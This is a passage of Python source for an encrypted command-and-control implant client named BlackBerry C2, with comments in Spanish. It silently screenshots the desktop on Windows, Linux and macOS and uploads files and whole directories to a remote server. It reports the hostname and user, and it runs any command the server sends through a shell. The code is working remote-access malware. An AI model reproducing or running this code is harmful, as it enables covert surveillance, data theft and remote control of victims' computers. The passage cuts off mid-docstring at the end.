        user32 = windll.user32
        gdi32 = windll.gdi32
        
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        
        hdc_screen = user32.GetDC(0)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbitmap = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
        gdi32.SelectObject(hdc_mem, hbitmap)
        gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
        
        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth = screen_width
        bmi.bmiHeader.biHeight = -screen_height
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 24
        bmi.bmiHeader.biCompression = 0
        
        bitmap_size = screen_width * screen_height * 3
        bitmap_data = (BYTE * bitmap_size)()
        gdi32.GetDIBits(hdc_mem, hbitmap, 0, screen_height, bitmap_data, byref(bmi), 0)
        
        gdi32.DeleteObject(hbitmap)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(0, hdc_screen)
        
        return _create_bmp_from_rgb(bytes(bitmap_data), screen_width, screen_height)
    except Exception:
        return None

def _capture_screenshot_linux():
    """Captura en Linux usando herramientas del sistema"""
    try:
        # Método 1: scrot
        try:
            result = subprocess.run(['scrot', '-o', '/dev/stdout'],
                                  capture_output=True, timeout=5, check=False)
            if result.returncode == 0 and result.stdout:
                return result.stdout
        except:
            pass
        
        # Método 2: imagemagick
        try:
            result = subprocess.run(['import', '-window', 'root', 'png:-'],
                                  capture_output=True, timeout=5, check=False)
            if result.returncode == 0 and result.stdout:
                return result.stdout
        except:
            pass
        
        # Método 3: gnome-screenshot
        try:
            tmp_path = '/dev/shm/.tmp_' + hashlib.md5(os.urandom(16)).hexdigest()[:8]
            result = subprocess.run(['gnome-screenshot', '-f', tmp_path],
                                  capture_output=True, timeout=5, check=False)
            if result.returncode == 0 and os.path.exists(tmp_path):
                with open(tmp_path, 'rb') as f:
                    data = f.read()
                try:
                    os.remove(tmp_path)
                except:
                    pass
                return data
        except:
            pass
        
        # Método 4: xwd + convert
        try:
            xwd_result = subprocess.run(['xwd', '-root', '-silent'],
                                      capture_output=True, timeout=5, check=False)
            if xwd_result.returncode == 0:
                convert_result = subprocess.run(['convert', 'xwd:-', 'png:-'],
                                              input=xwd_result.stdout,
                                              capture_output=True, timeout=5, check=False)
                if convert_result.returncode == 0 and convert_result.stdout:
                    return convert_result.stdout
        except:
            pass
        
        return None
    except Exception:
        return None

def _capture_screenshot_macos():
    """Captura en macOS usando screencapture nativo"""
    try:
        tmp_path = '/tmp/.tmp_' + hashlib.md5(os.urandom(16)).hexdigest()[:8] + '.png'
        result = subprocess.run(['screencapture', '-x', '-t', 'png', tmp_path],
                              capture_output=True, timeout=5, check=False)
        
        if result.returncode == 0 and os.path.exists(tmp_path):
            with open(tmp_path, 'rb') as f:
                data = f.read()
            try:
                os.remove(tmp_path)
            except:
                pass
            return data
        return None
    except Exception:
        return None

def _create_bmp_from_rgb(rgb_data, width, height):
    """Crea un archivo BMP desde datos RGB raw"""
    try:
        row_size = ((width * 3 + 3) // 4) * 4
        pixel_data_size = row_size * height
        file_size = 54 + pixel_data_size
        
        bmp_header = bytearray([
            0x42, 0x4D,  # BM
            *file_size.to_bytes(4, 'little'),
            0, 0, 0, 0,
            54, 0, 0, 0
        ])
        
        info_header = bytearray([
            40, 0, 0, 0,
            *width.to_bytes(4, 'little'),
            *height.to_bytes(4, 'little'),
            1, 0, 24, 0, 0, 0, 0, 0,
            *pixel_data_size.to_bytes(4, 'little'),
            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
        ])
        
        pixel_data = bytearray()
        row_padding = row_size - (width * 3)
        
        for y in range(height - 1, -1, -1):
            row_start = y * width * 3
            for x in range(width):
                pixel_start = row_start + (x * 3)
                r = rgb_data[pixel_start]
                g = rgb_data[pixel_start + 1]
                b = rgb_data[pixel_start + 2]
                pixel_data.extend([b, g, r])
            pixel_data.extend([0] * row_padding)
        
        return bytes(bmp_header + info_header + pixel_data)
    except Exception:
        return None

def process_command_and_respond(cmd, sock, aes_key):
    """
    Procesa comandos del servidor.
    COMANDOS:
    - PUT_DIR_RECURSIVE: Recibir directorio completo del servidor
    """
    if not cmd:
        return
    
    output = ""
    
    # Comando para obtener hostname real
    if cmd == "GET_HOSTNAME":
        try:
            output = socket.gethostname()
        except:
            output = "unknown"
    
    # Comando para reportar capacidades de compresión
    elif cmd == "GET_CAPABILITIES":
        caps = ["zlib"]
        if ZSTD_AVAILABLE:
            caps.append("zstd")
        output = "CAPS:" + ",".join(caps)
    
    elif cmd.startswith("FILE_EXISTS "):
        try:
            file_path = cmd.split(maxsplit=1)[1]
            if os.path.isfile(file_path):
                output = f"FILE_EXISTS:YES:{os.path.getsize(file_path)}"
            else:
                output = "FILE_NOT_FOUND"
        except:
            output = "FILE_NOT_FOUND"
    
    elif cmd.startswith("FILE_SIZE "):
        try:
            file_path = cmd.split(maxsplit=1)[1]
            if os.path.isfile(file_path):
                file_size = os.path.getsize(file_path)
                output = f"FILE_SIZE:{file_size}"
            else:
                output = "FILE_SIZE:0"
        except:
            output = "FILE_SIZE:0"
    
    #  Verificar si es directorio
    elif cmd.startswith("DIR_EXISTS "):
        try:
            dir_path = cmd.split(maxsplit=1)[1]
            if os.path.isdir(dir_path):
                output = "DIR_EXISTS:YES"
            else:
                output = "DIR_NOT_FOUND"
        except:
            output = "DIR_NOT_FOUND"
    
    elif cmd.startswith("cd "):
        try:
            target_dir = cmd.split(maxsplit=1)[1]
            os.chdir(target_dir)
            output = f"Directorio cambiado a: {os.getcwd()}"
        except Exception as e:
            output = f"[ERROR] cd: {e}"
    
    elif cmd == "GET_CWD":
        output = os.getcwd()
    
    elif cmd == "whoami":
        output = getpass.getuser()
    
    elif cmd.startswith("GET_FILE "):
        file_path = cmd.split(maxsplit=1)[1]
        send_file_to_server(sock, aes_key, file_path)
        return

    # ── Reanudación de descarga desde un offset ──────────────────────────────
    # Protocolo: GET_FILE_RESUME <ruta> <offset>
    # El servidor ya tiene los primeros <offset> bytes; enviamos desde ahí.
    elif cmd.startswith("GET_FILE_RESUME "):
        parts = cmd.split(maxsplit=2)
        if len(parts) < 3:
            send_encrypted_message(sock, "[ERROR] GET_FILE_RESUME: faltan argumentos", aes_key)
            return
        file_path  = parts[1]
        try:
            offset = int(parts[2])
        except ValueError:
            send_encrypted_message(sock, "[ERROR] GET_FILE_RESUME: offset inválido", aes_key)
            return

        # Validar fichero
        if not os.path.isfile(file_path):
            send_encrypted_message(sock, f"[ERROR] Archivo no encontrado: {file_path}", aes_key)
            return

        file_size = os.path.getsize(file_path)
        if offset >= file_size:
            send_encrypted_message(sock, f"[ERROR] Offset {offset} >= tamaño {file_size}", aes_key)
            return

        # Calcular hash del fichero COMPLETO (el servidor lo verificará al final)
        sha = hashlib.sha256()
        with open(file_path, 'rb') as fh:
            for chunk in iter(lambda: fh.read(65536), b""):
                sha.update(chunk)
        file_hash = sha.hexdigest()

        timeout_dyn = calculate_file_timeout(file_size - offset)

        # Enviar header SIZE con tamaño TOTAL y hash total
        # (el servidor acumulará desde offset para verificar)
        header = f"SIZE {file_size - offset} {file_hash}"
        if not send_encrypted_message(sock, header, aes_key, timeout=timeout_dyn):
            return

        # Enviar desde offset
        with open(file_path, 'rb') as fh:
            fh.seek(offset)
            for chunk in iter(lambda: fh.read(CHUNK_SIZE), b""):
                flag  = 0
                data  = chunk
                try:
                    comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                    if len(comp) < len(chunk):
                        data  = comp
                        flag  = 1
                except Exception:
                    pass

                aesgcm = AESGCM(aes_key)
                nonce  = os.urandom(12)
                ct     = aesgcm.encrypt(nonce, data, None)
                packet = bytes([flag]) + nonce + ct
                full   = struct.pack('!I', len(packet)) + packet
                sock.settimeout(timeout_dyn)
                sock.sendall(full)
        return
    
    # Comando GET_DIR_RECURSIVE (enviar directorio al servidor)
    elif cmd.startswith("GET_DIR_RECURSIVE "):
        dir_path = cmd.split(maxsplit=1)[1]
        
        # Verificar que existe y es directorio
        if not os.path.isdir(dir_path):
            send_encrypted_message(sock, f"[ERROR] No es un directorio: {dir_path}", aes_key)
            return
        
        # Enviar directorio recursivamente
        success = send_directory_recursive(sock, aes_key, dir_path)
        
        if success:
            send_encrypted_message(sock, "[SUCCESS] Directorio enviado completamente", aes_key)
        else:
            send_encrypted_message(sock, "[ERROR] Error enviando directorio", aes_key)
        return
    
    # Comando SCREENSHOT (capturar pantalla)
    elif cmd == "SCREENSHOT" or cmd.startswith("SCREENSHOT"):
        try:
            screenshot_data = capture_screenshot()
            if screenshot_data:
                # Enviar el tamaño primero
                size = len(screenshot_data)
                sha = hashlib.sha256(screenshot_data).hexdigest()
                header = f"SCREENSHOT_SIZE {size} {sha}"
                send_encrypted_message(sock, header, aes_key, timeout=60)
                
                # Enviar la imagen en chunks
                timeout_val = calculate_file_timeout(size)
                offset = 0
                while offset < size:
                    chunk = screenshot_data[offset:offset + CHUNK_SIZE]
                    offset += CHUNK_SIZE
                    
                    flag = 0
                    payload_chunk = chunk
                    
                    if ENABLE_COMPRESSION:
                        try:
                            comp = zlib.compress(chunk, level=COMPRESSION_LEVEL)
                            if len(comp) < len(chunk):
                                payload_chunk = comp
                                flag = 1
                        except:
                            pass
                    
                    aesgcm = AESGCM(aes_key)
                    nonce = os.urandom(12)
                    ct = aesgcm.encrypt(nonce, payload_chunk, None)
                    packet = bytes([flag]) + nonce + ct
                    full_packet = struct.pack('!I', len(packet)) + packet
                    
                    sock.settimeout(timeout_val)
                    sock.sendall(full_packet)
                
                # Confirmar envío exitoso
                send_encrypted_message(sock, "[SUCCESS] Screenshot capturada y enviada", aes_key)
                return
            else:
                output = "[ERROR] No se pudo capturar la pantalla"
        except Exception as e:
            output = f"[ERROR] Screenshot: {str(e)}"
    
    # Comando PUT_DIR_RECURSIVE (recibir directorio)
    elif cmd.startswith("PUT_DIR_RECURSIVE"):
        success = receive_directory_recursive(sock, aes_key)
        if success:
            send_encrypted_message(sock, "[SUCCESS] Directorio recibido completamente", aes_key)
        else:
            send_encrypted_message(sock, "[ERROR] Error recibiendo directorio", aes_key)
        return
    
    else:
        try:
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=60,
                errors='replace'
            )
            output = (result.stdout + result.stderr).strip()
            if not output:
                output = f"[Comando ejecutado. Código: {result.returncode}]"
        except subprocess.TimeoutExpired:
            output = "[ERROR] Timeout ejecutando comando (60s)"
        except Exception as e:
            output = f"[ERROR] Ejecutando comando: {str(e)}"
    
    send_encrypted_message(sock, output, aes_key)
 
BT_CHUNK_SIZE = 256 * 1024  # 256KB por chunk en transfers


def bt_print_progress(label, transferred, total, start_time, width=38):
    """Barra de progreso inline estilo scp."""
    if total <= 0:
        return
    pct = min(100, int(transferred * 100 / total))
    filled = int(width * pct / 100)
    bar = '█' * filled + '░' * (width - filled)
    elapsed = max(0.001, time.time() - start_time)
    speed = transferred / elapsed
    remaining = max(0, total - transferred)
    eta = int(remaining / speed) if speed > 0 else 0

    def _fmt(b):
        for u in ['B', 'KB', 'MB', 'GB']:
            if b < 1024:
                return f"{b:.1f}{u}"
            b /= 1024
        return f"{b:.1f}TB"

    def _ftime(s):
        return f"{s // 60}m{s % 60:02d}s" if s >= 60 else f"{s}s"

    name = os.path.basename(label)[:18]
    line = (f"\r  {name:<18} |{bar}| {pct:3d}%"
            f"  {_fmt(transferred)}/{_fmt(total)}"
            f"  {_fmt(speed)}/s  ETA {_ftime(eta)}  ")
    sys.stdout.write(line)
    sys.stdout.flush()
    if transferred >= total:
        sys.stdout.write('\n')
        sys.stdout.flush()


def bt_send_raw_chunks(sock, aes_key, file_path, file_size, start_time, timeout=3600):
    """
    Envía el contenido de un archivo en chunks con AES-GCM + HMAC-SHA256 por paquete.
    Formato: [4:len][8:seq][1:flag][12:nonce][ciphertext][32:HMAC]
    HMAC cubre: seq || nonce || ciphertext
    Devuelve el sha256 hexdigest del contenido original.
    """
    sha = hashlib.sha256()
    sent = 0
    seq = 0

    with open(file_path, 'rb') as f:
        while True:
            chunk = f.read(BT_CHUNK_SIZE)
            if not chunk:
                break
            sha.update(chunk)

            flag = 0
            payload = chunk
            if ENABLE_COMPRESSION and len(chunk) > 1024:
                try:
                    comp = zlib.compress(chunk, level=6)
                    if len(comp) < len(chunk):
                        payload = comp
                        flag = 1
                except Exception:
                    pass

            aesgcm = AESGCM(aes_key)
            nonce = os.urandom(12)
            ct = aesgcm.encrypt(nonce, payload, None)

            # HMAC sobre: seq || nonce || ciphertext
            seq_bytes = struct.pack('!Q', seq)
            hmac_data = seq_bytes + nonce + ct
            hmac_tag = hmac_module.new(aes_key, hmac_data, hashlib.sha256).digest()

            # Paquete: [8:seq][1:flag][12:nonce][ciphertext][32:HMAC]
            packet = seq_bytes + bytes([flag]) + nonce + ct + hmac_tag
            full_packet = struct.pack('!I', len(packet)) + packet
            sock.settimeout(timeout)
            sock.sendall(full_packet)

            seq += 1
            sent += len(chunk)
            bt_print_progress(file_path, sent, file_size, start_time)

    return sha.hexdigest()


def bt_recv_raw_chunks(sock, aes_key, dest_path, file_size, label=None, timeout=3600):
    """
    Recibe chunks con AES-GCM + HMAC-SHA256 y los escribe en dest_path.
    Formato esperado: [4:len][8:seq][1:flag][12:nonce][ciphertext][32:HMAC]
    Devuelve el sha256 hexdigest del contenido recibido.
    """
    sha = hashlib.sha256()
    received = 0
    start_time = time.time()
    expected_seq = 0

    os.makedirs(os.path.dirname(os.path.abspath(dest_path)), exist_ok=True)

    with open(dest_path, 'wb') as f:
        while received < file_size:
            raw_len = recvall(sock, 4, timeout=timeout)
            if not raw_len:
                return None

            pkt_len = struct.unpack('!I', raw_len)[0]
            packet = recvall(sock, pkt_len, timeout=timeout)
            # Mínimo: 8(seq)+1(flag)+12(nonce)+1(ct_min)+32(HMAC) = 54
            if not packet or len(packet) < 54:
                return None

            seq_bytes = packet[0:8]
            flag      = packet[8]
            nonce     = packet[9:21]
            hmac_tag  = packet[-32:]
            ct        = packet[21:-32]

            # Verificar HMAC
            hmac_data = seq_bytes + nonce + ct
            expected_hmac = hmac_module.new(aes_key, hmac_data, hashlib.sha256).digest()
            if not hmac_module.compare_digest(hmac_tag, expected_hmac):
                print(f"\n  [!] HMAC inválido en chunk seq={struct.unpack('!Q', seq_bytes)[0]}")
                return None

            # Verificar secuencia (anti-replay)
            seq_num = struct.unpack('!Q', seq_bytes)[0]
            if seq_num != expected_seq:
                print(f"\n  [!] Secuencia incorrecta: esperado {expected_seq}, recibido {seq_num}")
                return None
            expected_seq += 1

            try:
                aesgcm = AESGCM(aes_key)
                chunk = aesgcm.decrypt(nonce, ct, None)
            except Exception:
                return None

            if flag == 1:
                try:
                    chunk = zlib.decompress(chunk)
                except Exception:
                    return None
            elif flag == 2:
                if ZSTD_AVAILABLE:
                    try:
                        dctx = zstd.ZstdDecompressor()
                        chunk = dctx.decompress(chunk)
                    except Exception:
                        return None
                else:
                    return None

            f.write(chunk)
            sha.update(chunk)
            received += len(chunk)

            bt_print_progress(label or dest_path, received, file_size, start_time)

    return sha.hexdigest()


def _bt_calc_sha256(file_path):
    sha = hashlib.sha256()
    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(65536), b''):
            sha.update(chunk)
    return sha.hexdigest()


def bt_upload_file(sock, aes_key, local_path, remote_dest=None):
    """Sube un archivo al servidor BerryTransfer."""
    if not os.path.isfile(local_path):
        print(f"[!] Archivo no encontrado: {local_path}")
        return False

    file_size = os.path.getsize(local_path)
    file_name = os.path.basename(local_path)
    dest_name = remote_dest or file_name

    print(f"[→] Calculando hash…")
    file_hash = _bt_calc_sha256(local_path)

    meta = json.dumps({"name": dest_name, "size": file_size, "sha256": file_hash})
    print(f"[→] Subiendo: {file_name}  ({file_size:,} bytes)")

    if not send_encrypted_message(sock, f"BT:UPLOAD:{meta}", aes_key):
        print("[!] Error enviando cabecera de upload")
        return False

    _, resp = receive_encrypted_message(sock, aes_key, timeout=30)
    if resp != "BT:READY":
        print(f"[!] Servidor rechazó upload: {resp}")
        return False

    start_time = time.time()
    actual_hash = bt_send_raw_chunks(sock, aes_key, local_path, file_size, start_time)

    _, resp = receive_encrypted_message(sock, aes_key, timeout=120)
    if resp and resp.startswith("BT:DONE"):
        elapsed = time.time() - start_time
        speed = file_size / elapsed if elapsed > 0 else 0
        def _s(b):
            for u in ['B','KB','MB','GB']:
                if b<1024: return f"{b:.1f}{u}"
                b/=1024
            return f"{b:.1f}TB"
        print(f"[+] {filename}  {_s(file_size)} en {elapsed:.1f}s  ({_s(speed)}/s)")
        return True
    else:
        print(f"[!] Error del servidor: {resp}")
        return False


def bt_upload_directory(sock, aes_key, local_dir, remote_dest=None):
    """Sube un directorio completo recursivamente al servidor BerryTransfer."""
    if not os.path.isdir(local_dir):
        print(f"[!] Directorio no encontrado: {local_dir}")
        return False

    local_dir = os.path.normpath(local_dir)
    dir_name  = os.path.basename(local_dir)
    base_path = os.path.dirname(local_dir)

    # Recopilar archivos
    files = []
    for root, dirs, fnames in os.walk(local_dir):
        dirs.sort()
        for fname in sorted(fnames):
            fp = os.path.join(root, fname)
            if os.path.isfile(fp) and not os.path.islink(fp):
                rel = os.path.relpath(fp, base_path)
                files.append((fp, rel))

    total_files = len(files)
    dest_base = remote_dest or dir_name
    print(f"[→] Subiendo directorio: {dir_name}  ({total_files} archivos)")

    meta = json.dumps({"base": dest_base, "count": total_files})
    if not send_encrypted_message(sock, f"BT:UPLOAD_DIR:{meta}", aes_key):
        return False

    _, resp = receive_encrypted_message(sock, aes_key, timeout=30)
    if resp != "BT:READY":
        print(f"[!] Servidor rechazó upload_dir: {resp}")
        return False

    global_start = time.time()
    total_bytes = 0

    for i, (fp, rel_path) in enumerate(files, 1):
        file_size = os.path.getsize(fp)
        total_bytes += file_size
        file_hash = _bt_calc_sha256(fp)

        fmeta = json.dumps({"path": rel_path, "size": file_size, "sha256": file_hash})
        print(f"\n  [{i}/{total_files}] {rel_path}  ({file_size:,} bytes)")

        if not send_encrypted_message(sock, f"BT:FILE:{fmeta}", aes_key):
            return False

        _, resp = receive_encrypted_message(sock, aes_key, timeout=30)
        if resp != "BT:FILE_READY":
            print(f"  [!] Error en {rel_path}: {resp}")
            return False

        start_time = time.time()
        bt_send_raw_chunks(sock, aes_key, fp, file_size, start_time)

        _, resp = receive_encrypted_message(sock, aes_key, timeout=120)
        if not resp or not resp.startswith("BT:FILE_OK"):
            print(f"  [!] Hash mismatch o error en {rel_path}: {resp}")
            return False

    # Fin del directorio
    send_encrypted_message(sock, "BT:DIR_DONE", aes_key)
    _, resp = receive_encrypted_message(sock, aes_key, timeout=30)

    elapsed = time.time() - global_start
    def _s(b):
        for u in ['B','KB','MB','GB']:
            if b<1024: return f"{b:.1f}{u}"
            b/=1024
        return f"{b:.1f}TB"

    if resp and resp.startswith("BT:ALL_DONE"):
        print(f"\n[+] Directorio {dir_name}  {_s(total_bytes)} en {elapsed:.1f}s")
        return True
    else:
        print(f"[!] Error al finalizar directorio: {resp}")
        return False


def bt_download_file(sock, aes_key, remote_path, local_dest=None):
    """
    Descarga un archivo O directorio del servidor BerryTransfer.

    El servidor responde con:
      BT:SENDING:<json>       → archivo único
      BT:SENDING_DIR:<json>   → directorio (múltiples archivos)
      BT:ERR:download_denied  → denegado por el operador
      BT:ERR:not_found:<arg>  → no encontrado

    Muestra un countdown de 60s mientras el operador confirma.
    """
    CONFIRM_TIMEOUT = 60

    def _s(b):
        for u in ['B', 'KB', 'MB', 'GB']:
            if b < 1024: return f"{b:.1f}{u}"
            b /= 1024
        return f"{b:.1f}TB"

    display = os.path.basename(remote_path) or remote_path
    print(f"\n  [←] GET  {display}")
    print(f"  Servidor: {SERVER_HOST}:{SERVER_PORT}")
    print()

    if not send_encrypted_message(sock, f"BT:DOWNLOAD:{remote_path}", aes_key):
        print("[!] No se pudo enviar la solicitud")
        return False

    # ── Countdown mientras el operador confirma ─────────────────────────────
    result_container = [None]
    cancel_flag      = threading.Event()

    def _recv_thread():
        try:
            _, resp = receive_encrypted_message(sock, aes_key, timeout=CONFIRM_TIMEOUT + 15)
            result_container[0] = resp
        except Exception:
            result_container[0] = None
        finally:
            cancel_flag.set()

    recv_t = threading.Thread(target=_recv_thread, daemon=True)
    recv_t.start()

    print(f"  \033[33m⏳ Esperando confirmación del operador en el servidor...\033[0m")
    print(f"  \033[90m   Ctrl+C para cancelar\033[0m\n")

    deadline = time.time() + CONFIRM_TIMEOUT
    try:
        while not cancel_flag.is_set():
            remaining = int(deadline - time.time())
            if remaining <= 0:
                sys.stdout.write(f"\r  \033[33m⏳ Esperando confirmación...  0s  \033[0m")
                sys.stdout.flush()
                break
            total_w = 30
            filled  = int(total_w * remaining / CONFIRM_TIMEOUT)
            bar     = '█' * filled + '░' * (total_w - filled)
            sys.stdout.write(
                f"\r  \033[33m⏳ [{bar}] {remaining:2d}s  "
                f"(confirm '{display}' en el servidor)\033[0m   "
            )
            sys.stdout.flush()
            cancel_flag.wait(timeout=0.5)

    except KeyboardInterrupt:
        sys.stdout.write("\n")
        sys.stdout.flush()
        print("\n  \033[91m[-] Cancelado por el usuario (Ctrl+C)\033[0m")
        try:
            send_encrypted_message(sock, f"BT:CANCEL_GET:{remote_path}", aes_key, timeout=5)
        except Exception:
            pass
        cancel_flag.set()
        return False

    sys.stdout.write("\n")
    sys.stdout.flush()
    recv_t.join(timeout=5)
    resp = result_container[0]

    # ── Procesar respuesta ──────────────────────────────────────────────────
    if not resp:
        print("\n  \033[91m[-] Sin respuesta del servidor — tiempo agotado o conexión perdida\033[0m")
        return False

    if resp == "BT:ERR:download_denied":
        print("\n  \033[91m[-] El operador DENEGÓ la descarga\033[0m")
        return False

    if resp.startswith("BT:ERR:"):
        err = resp[len("BT:ERR:"):]
        print(f"\n  \033[91m[!] Error del servidor: {err}\033[0m")
        if "not_found" in err:
            print(f"  \033[90m    Pista: usa --ls para ver qué hay disponible en el servidor\033[0m")
        return False

    # ── Archivo único ───────────────────────────────────────────────────────
    if resp.startswith("BT:SENDING:"):
        try:
            meta = json.loads(resp[len("BT:SENDING:"):])
        except Exception as e:
            print(f"  [!] Metadatos inválidos: {e}  raw={resp!r}")
            return False

        srv_name   = meta["name"]
        file_size  = int(meta["size"])
        file_hash  = meta["sha256"]
        local_path = local_dest or srv_name

        print(f"\n  \033[92m[+] Confirmado — recibiendo archivo '{srv_name}'  ({_s(file_size)})\033[0m")
        print(f"  Destino : {os.path.abspath(local_path)}\n")

        start_time  = time.time()
        actual_hash = bt_recv_raw_chunks(sock, aes_key, local_path, file_size, label=srv_name)

        if actual_hash is None:
            print(f"\n  \033[91m[!] Error recibiendo datos\033[0m")
            try: os.remove(local_path)
            except Exception: pass
            return False

        if actual_hash != file_hash:
            print(f"\n  \033[91m[!] Hash mismatch — archivo corrupto, eliminado\033[0m")
            print(f"  esperado : {file_hash}")
            print(f"  recibido : {actual_hash}")
            try: os.remove(local_path)
            except Exception: pass
            return False

        elapsed = time.time() - start_time
        speed   = file_size / elapsed if elapsed > 0 else 0
        print(f"\n  \033[92m[✓] {local_path}  {_s(file_size)}  "
              f"en {elapsed:.1f}s  ({_s(speed)}/s)\033[0m\n")
        return True

    # ── Directorio ──────────────────────────────────────────────────────────
    elif resp.startswith("BT:SENDING_DIR:"):
        try:
            dir_meta = json.loads(resp[len("BT:SENDING_DIR:"):])
        except Exception as e:
            print(f"  [!] Metadatos de directorio inválidos: {e}")
            return False

        dir_name  = dir_meta["name"]
        n_files   = int(dir_meta.get("files", 0))
        total_sz  = int(dir_meta.get("size", 0))
        base_dir  = local_dest or dir_name

        print(f"\n  \033[92m[✓] Confirmado — recibiendo directorio '{dir_name}' "
              f"({n_files} archivos, {_s(total_sz)})\033[0m")
        print(f"  Destino : {os.path.abspath(base_dir)}\n")

        os.makedirs(base_dir, exist_ok=True)

        global_start = time.time()
        ok_files = 0
        fail_files = 0
        total_received = 0

        while True:
            _, file_msg = receive_encrypted_message(sock, aes_key, timeout=120)
            if file_msg is None:
                print(f"\n  \033[91m[!] Conexión perdida durante descarga del directorio\033[0m")
                return False

            if file_msg == "BT:DIR_DONE":
                break

            if not file_msg.startswith("BT:DIR_FILE:"):
                print(f"  [!] Mensaje inesperado en dir: {file_msg!r}")
                continue

            try:
                f_meta    = json.loads(file_msg[len("BT:DIR_FILE:"):])
                rel_path  = f_meta["path"]
                f_name    = f_meta["name"]
                f_size    = int(f_meta["size"])
                f_hash    = f_meta["sha256"]
                idx       = f_meta.get("index", "?")
                total_n   = f_meta.get("total", "?")

                # Construir ruta local segura
                safe_parts = [p for p in rel_path.replace('\\','/').split('/') if p and p != '..']
                local_file = os.path.join(base_dir, *safe_parts)
                os.makedirs(os.path.dirname(local_file), exist_ok=True)

                print(f"  [{idx}/{total_n}] {rel_path}  ({_s(f_size)})", end='', flush=True)

                # ACK al servidor
                send_encrypted_message(sock, "BT:DIR_FILE_READY", aes_key)

                actual_hash = bt_recv_raw_chunks(sock, aes_key, local_file, f_size, label=f_name)

                if actual_hash is None:
                    print(f"  \033[91m[-] error recibiendo\033[0m")
                    send_encrypted_message(sock, f"BT:DIR_FILE_ERR:recv_error", aes_key)
                    fail_files += 1
                    continue

                if actual_hash != f_hash:
                    print(f"  \033[91m[!] hash mismatch\033[0m")
                    print(f"    esperado : {f_hash}")
                    print(f"    recibido : {actual_hash}")
                    send_encrypted_message(sock, f"BT:DIR_FILE_ERR:hash_mismatch", aes_key)
                    try: os.remove(local_file)
                    except Exception: pass
                    fail_files += 1
                    continue

                send_encrypted_message(sock, f"BT:DIR_FILE_OK:{f_name}", aes_key)
                ok_files += 1
                total_received += f_size

            except Exception as e:
                print(f"\n  [!] Error procesando archivo del directorio: {e}")
                send_encrypted_message(sock, f"BT:DIR_FILE_ERR:{e}", aes_key)
                fail_files += 1

        elapsed = time.time() - global_start
        speed   = total_received / elapsed if elapsed > 0 else 0

        if fail_files == 0:
            print(f"\n  \033[92m[+] Directorio '{dir_name}' completo: "
                  f"{ok_files}/{n_files} archivos  {_s(total_received)}  "
                  f"en {elapsed:.1f}s  ({_s(speed)}/s)\033[0m\n")
            return True
        else:
            print(f"\n  \033[93m[⚠] Directorio '{dir_name}' parcial: "
                  f"{ok_files} OK / {fail_files} fallos  "
                  f"en {elapsed:.1f}s\033[0m\n")
            return False

    else:
        print(f"\n  \033[91m[-] Respuesta inesperada del servidor: {resp!r}\033[0m")
        return False


def bt_list_remote(sock, aes_key, remote_path="."):
    """Lista un directorio remoto en el servidor BerryTransfer."""
    send_encrypted_message(sock, f"BT:LIST:{remote_path}", aes_key)
    _, resp = receive_encrypted_message(sock, aes_key, timeout=15)

    if not resp or not resp.startswith("BT:LS:"):
        print(f"[!] Error listando {remote_path}: {resp}")
        return

    try:
        entries = json.loads(resp[len("BT:LS:"):])
        print(f"\n  📂 {remote_path}/")
        for e in entries:
            def _s(b):
                for u in ['B','KB','MB','GB']:
                    if b<1024: return f"{b:.1f}{u}"
                    b/=1024
                return f"{b:.1f}TB"
            if e['type'] == 'd':
                print(f"      📁  {'':>10}  {e['name']}/")
            else:
                print(f"      📄  {_s(e.get('size',0)):>10}  {e['name']}")
        print()
    except Exception as e:
        print(f"[!] Error parseando lista: {e}\n{resp}")


def _do_ecdh_handshake(sock):
    """Handshake ECDHE+HMAC — idéntico al de run_client pero standalone."""
    banner = sock.recv(1024)
    print(f"[*] Banner: {banner.decode('utf-8','ignore').strip()}")

    sock.sendall(b"REQUEST_PUBKEY")

    pem_data = b''
    while b'-----END PUBLIC KEY-----' not in pem_data:
        chunk = sock.recv(8192)
        if not chunk:
            raise ValueError("Conexión perdida durante key exchange")
        pem_data += chunk

    if not pem_data.startswith(b'ECDH_PUBKEY:'):
        raise ValueError("Respuesta de servidor inválida en key exchange")

    server_ecdh_pub_pem = pem_data[len(b'ECDH_PUBKEY:'):]
    server_ecdh_pub = serialization.load_pem_public_key(server_ecdh_pub_pem)

    if VERIFY_FINGERPRINT:
        fp = get_ecdhe_fingerprint(server_ecdh_pub_pem)
        print(f"[*] Fingerprint servidor ECDHE: {fp}")
        if fp.lower() != EXPECTED_FINGERPRINT.lower():
            raise ValueError("Fingerprint ECDHE no coincide. Posible MITM.")
        print("[+] Fingerprint ECDHE verificado")

    client_ecdh_private = ec.generate_private_key(ec.SECP256R1())
    client_ecdh_public_pem = client_ecdh_private.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )

    shared_secret = client_ecdh_private.exchange(ec.ECDH(), server_ecdh_pub)

    aes_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'BlackBerryC2_AES_KEY',
    ).derive(shared_secret)

    hmac_tag = hmac_module.new(
        HMAC_PRE_SHARED_SECRET, shared_secret, hashlib.sha256
    ).digest()

    sock.sendall(struct.pack('!I', len(client_ecdh_public_pem)) + client_ecdh_public_pem)
    sock.sendall(hmac_tag)

    return aes_key


def run_transfer_client(bt_put=None, bt_get=None, bt_dest=None, bt_ls=None):
    """
    Modo BerryTransfer — transferencia de archivos sobre el protocolo BlackBerry C2.

    --put  <archivo|carpeta>   →  Sube al servidor (siempre permitido, auto-detecta tipo)
    --get  <nombre_archivo>    →  Descarga del servidor (requiere confirmación del operador)
    --ls   [<ruta>]            →  Lista archivos disponibles en el servidor
    --dest <ruta_local>        →  Destino local para --get (opcional)

    El servidor debe iniciarse con:
